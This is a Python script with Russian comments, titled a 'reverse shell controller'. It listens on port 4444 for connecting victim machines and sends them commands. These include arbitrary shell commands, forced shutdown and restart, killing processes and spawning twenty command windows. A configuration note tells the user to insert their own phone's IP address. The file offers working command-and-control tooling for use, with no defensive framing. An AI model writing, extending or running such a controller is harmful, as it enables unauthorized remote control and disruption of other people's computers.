#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import sys
import os
import time
from colorama import init, Fore, Back, Style

init(autoreset=True)

# ============ КОНФИГУРАЦИЯ ============
PORT = 4444
# ВСТАВЬ СВОЙ IP ТЕЛЕФОНА (из ifconfig)
MY_IP = "192.168.1.82"  # <----- ЗАМЕНИ НА СВОЙ
# =====================================

class ShellController:
    def __init__(self):
        self.clients = []
        self.active_client = None
        self.running = True
        self.lock = threading.Lock()
    
    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Используем фиксированный IP
        host = MY_IP
        
        try:
            server.bind((host, PORT))
            server.listen(5)
            print(f"[+] Сервер запущен на {host}:{PORT}")
            print(f"[!] Жду подключения...")
            
            accept_thread = threading.Thread(target=self.accept_clients, args=(server,))
            accept_thread.daemon = True
            accept_thread.start()
            
            self.console()
            
        except Exception as e:
            print(f"[-] Ошибка: {e}")
        finally:
            server.close()
    
    def accept_clients(self, server):
        while self.running:
            try:
                client, addr = server.accept()
                with self.lock:
                    self.clients.append(client)
                    self.active_client = client
                print(f"\n[+] Новое подключение: {addr}")
            except:
                pass
    
    def send_command(self, command):
        if self.active_client:
            try:
                self.active_client.send(command.encode('utf-8'))
                return True
            except:
                return False
        return False
    
    def console(self):
        while self.running:
            try:
                cmd = input("\n[SHELL]> ").strip().lower()
                
                if cmd == "exit":
                    self.running = False
                    break
                elif cmd == "calc":
                    self.send_command("calc")
                    print("[+] Калькулятор запущен")
                elif cmd == "cmd20":
                    self.send_command("cmd20")
                    print("[+] 20 окон CMD открыты")
                elif cmd == "shutdown":
                    self.send_command("shutdown")
                    print("[!] Выключение...")
                elif cmd == "restart":
                    self.send_command("restart")
                    print("[!] Перезагрузка...")
                elif cmd == "taskkill":
                    self.send_command("taskkill")
                    print("[!] Процессы завершены")
                elif cmd == "browser":
                    self.send_command("browser")
                    print("[+] Браузер открыт")
                elif cmd.startswith("cmd "):
                    self.send_command(cmd)
                    print(f"[+] Выполняю: {cmd[4:]}")
                else:
                    print("[-] Неизвестная команда")
                    
            except KeyboardInterrupt:
                self.running = False
                break

if __name__ == "__main__":
    os.system('clear')
    print("="*50)
    print("REVERSE SHELL CONTROLLER")
    print(f"Сервер: {MY_IP}:{PORT}")
    print("="*50)
    controller = ShellController()
    controller.start_server()